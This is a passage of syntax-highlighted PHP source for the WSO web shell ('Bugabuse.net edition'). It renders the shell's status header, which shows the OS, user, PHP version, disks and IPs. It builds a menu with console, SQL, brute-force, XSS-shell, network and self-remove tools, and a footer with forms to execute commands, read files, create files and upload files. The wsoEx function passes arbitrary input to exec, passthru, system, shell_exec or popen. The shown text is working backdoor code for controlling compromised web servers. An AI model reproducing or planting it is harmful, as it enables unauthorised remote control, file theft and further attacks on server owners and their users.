        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nv">$i</span><span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span>
            <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="nv">$path</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
        <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$path</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nv">$charsets</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;Windows-1251&#39;</span><span class="p">,</span> <span class="s1">&#39;KOI8-R&#39;</span><span class="p">,</span> <span class="s1">&#39;KOI8-U&#39;</span><span class="p">,</span> <span class="s1">&#39;cp866&#39;</span><span class="p">);</span>
    <span class="nv">$opt_charsets</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$charsets</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
        <span class="nv">$opt_charsets</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nv">$item</span><span class="o">.</span><span class="s1">&#39;&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$item</span><span class="o">?</span><span class="s1">&#39;selected&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$item</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/option&amp;gt;&#39;</span><span class="p">;</span>

    <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Sec. Info&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;SecInfo&#39;</span><span class="p">,</span><span class="s1">&#39;Files&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;FilesMan&#39;</span><span class="p">,</span><span class="s1">&#39;Console&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Console&#39;</span><span class="p">,</span><span class="s1">&#39;Sql&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Sql&#39;</span><span class="p">,</span> <span class="s1">&#39;PHP Tools&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;phptools&#39;</span> <span class="p">,</span><span class="s1">&#39;Php&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Php&#39;</span><span class="p">,</span><span class="s1">&#39;Safe mode&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;SafeMode&#39;</span><span class="p">,</span><span class="s1">&#39;String tools&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;StringTools&#39;</span><span class="p">,</span><span class="s1">&#39;XSS Shell&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;XSSShell&#39;</span><span class="p">,</span><span class="s1">&#39;Bruteforce&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Bruteforce&#39;</span><span class="p">,</span><span class="s1">&#39;Network&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Network&#39;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;auth_pass&#39;</span><span class="p">]))</span>
        <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;Logout&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;Logout&#39;</span><span class="p">;</span>
    <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;Self remove&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SelfRemove&#39;</span><span class="p">;</span>
    <span class="nv">$menu</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span>
        <span class="nv">$menu</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;th width=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="mi">100</span><span class="o">/</span><span class="nb">count</span><span class="p">(</span><span class="nv">$m</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;%&quot;&amp;gt;[ &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt; ]&amp;lt;/th&amp;gt;&#39;</span><span class="p">;</span>

    <span class="nv">$drives</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$drive</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39;:\\&#39;</span><span class="p">))</span>
            <span class="nv">$drives</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39;:/\&#39;)&quot;&amp;gt;[ &#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39; ]&amp;lt;/a&amp;gt; &#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;table class=info cellpadding=3 cellspacing=0 width=100%&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=1&amp;gt;&amp;lt;span&amp;gt;Uname:&amp;lt;br&amp;gt;User:&amp;lt;br&amp;gt;Php:&amp;lt;br&amp;gt;Hdd:&amp;lt;br&amp;gt;Cwd:&#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="o">?</span><span class="s1">&#39;&amp;lt;br&amp;gt;Drives:&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
       <span class="o">.</span> <span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;nobr&amp;gt;&#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="o">@</span><span class="nb">php_uname</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">120</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; &amp;lt;/nobr&amp;gt;&amp;lt;br&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$uid</span> <span class="o">.</span> <span class="s1">&#39; ( &#39;</span> <span class="o">.</span> <span class="nv">$user</span> <span class="o">.</span> <span class="s1">&#39; ) &amp;lt;span&amp;gt;Group:&amp;lt;/span&amp;gt; &#39;</span> <span class="o">.</span> <span class="nv">$gid</span> <span class="o">.</span> <span class="s1">&#39; ( &#39;</span> <span class="o">.</span> <span class="nv">$group</span> <span class="o">.</span> <span class="s1">&#39; )&amp;lt;br&amp;gt;&#39;</span> <span class="o">.</span> <span class="o">@</span><span class="nb">phpversion</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39; &amp;lt;span&amp;gt;Safe mode:&amp;lt;/span&amp;gt; &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;&amp;lt;font color=red&amp;gt;ON&amp;lt;/font&amp;gt;&#39;</span><span class="o">:</span><span class="s1">&#39;&amp;lt;font color=#00bb00&amp;gt;&amp;lt;b&amp;gt;OFF&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&#39;</span><span class="p">)</span>
       <span class="o">.</span> <span class="s1">&#39; &amp;lt;a href=# onclick=&quot;g(\&#39;Php\&#39;,null,\&#39;\&#39;,\&#39;info\&#39;)&quot;&amp;gt;[ phpinfo ]&amp;lt;/a&amp;gt; &amp;lt;span&amp;gt;Datetime:&amp;lt;/span&amp;gt; &#39;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span> <span class="o">.</span> <span class="nx">wsoViewSize</span><span class="p">(</span><span class="nv">$totalSpace</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; &amp;lt;span&amp;gt;Free:&amp;lt;/span&amp;gt; &#39;</span> <span class="o">.</span> <span class="nx">wsoViewSize</span><span class="p">(</span><span class="nv">$freeSpace</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; (&#39;</span><span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="p">(</span><span class="nv">$freeSpace</span><span class="o">/</span><span class="nv">$totalSpace</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;%)&amp;lt;br&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$cwd_links</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span><span class="o">.</span> <span class="nx">wsoPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &amp;lt;a href=# onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span> <span class="o">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;home_cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;[ home ]&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$drives</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span>
       <span class="o">.</span> <span class="s1">&#39;&amp;lt;td width=1 align=right&amp;gt;&amp;lt;nobr&amp;gt;&amp;lt;select onchange=&quot;g(null,null,null,null,null,this.value)&quot;&amp;gt;&amp;lt;optgroup label=&quot;Page charset&quot;&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$opt_charsets</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/optgroup&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Server IP:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&#39;</span> <span class="o">.</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Client IP:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/nobr&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span>
       <span class="o">.</span> <span class="s1">&#39;&amp;lt;table style=&quot;border-top:2px solid #333;&quot; cellpadding=3 cellspacing=0 width=100%&amp;gt;&amp;lt;tr&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$menu</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;div style=&quot;margin:5&quot;&amp;gt;&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">wsoFooter</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$is_writable</span> <span class="o">=</span> <span class="nb">is_writable</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">?</span><span class="s2">&quot; &amp;lt;font color=&#39;#25ff00&#39;&amp;gt;(Writeable)&amp;lt;/font&amp;gt;&quot;</span><span class="o">:</span><span class="s2">&quot; &amp;lt;font color=red&amp;gt;(Not writable)&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;</span>

<span class="s2">&amp;lt;/div&amp;gt;</span>
<span class="s2">&amp;lt;table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style=&#39;border-top:2px solid #333;border-bottom:2px solid #333;&#39;&amp;gt;</span>
<span class="s2">   &amp;lt;tr&amp;gt;</span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=&#39;g(null,this.c.value,</span><span class="se">\&quot;\&quot;</span><span class="s2">);return false;&#39;&amp;gt;&amp;lt;span&amp;gt;Change dir:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesTools&#39;,null,this.f.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;Read file:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">   &amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;</span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesMan&#39;,null,&#39;mkdir&#39;,this.d.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;Make dir:&amp;lt;/span&amp;gt;</span><span class="si">$is_writable</span><span class="s2">&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=d&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesTools&#39;,null,this.f.value,&#39;mkfile&#39;);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;Make file:&amp;lt;/span&amp;gt;</span><span class="si">$is_writable</span><span class="s2">&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>

<span class="s2">   &amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;</span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;Console&#39;,null,this.c.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;Execute:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=c value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form method=&#39;post&#39; ENCTYPE=&#39;multipart/form-data&#39;&amp;gt;</span>
<span class="s2">       &amp;lt;input type=hidden name=a value=&#39;FilesMAn&#39;&amp;gt;</span>
<span class="s2">       &amp;lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span>
<span class="s2">       &amp;lt;input type=hidden name=p1 value=&#39;uploadFile&#39;&amp;gt;</span>
<span class="s2">       &amp;lt;input type=hidden name=charset value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;</span>
<span class="s2">       &amp;lt;span&amp;gt;Upload file:&amp;lt;/span&amp;gt;</span><span class="si">$is_writable</span><span class="s2">&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=file name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br  &amp;gt;&amp;lt;/td&amp;gt;</span>

<span class="s2">   &amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;center&amp;gt;WSO Bugabuse.net edition - Modified by Led-Zeppelin&amp;lt;/center&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getpwuid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">false</span><span class="p">;}</span> <span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getgrgid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">false</span><span class="p">;}</span> <span class="p">}</span>

<span class="k">function</span> <span class="nf">wsoEx</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="o">@</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
            <span class="nv">$out</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="mi">1024</span><span class="p">);</span>
        <span class="nb">pclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">wsoViewSize</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1073741824</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1073741824</span> <span class="p">)</span><span class="o">.</span> <span class="s1">&#39; GB&#39;</span><span class="p">;</span>
    <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1048576</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1048576</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; MB&#39;</span><span class="p">;</span>
    <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1024</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1024</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; KB&#39;</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="k">return</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39; B&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">wsoPerms</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xC000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xA000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;l&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x6000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x2000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span>
    <span class="k">else</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;u&#39;</span><span class="p">;</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0100</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0080</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0040</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
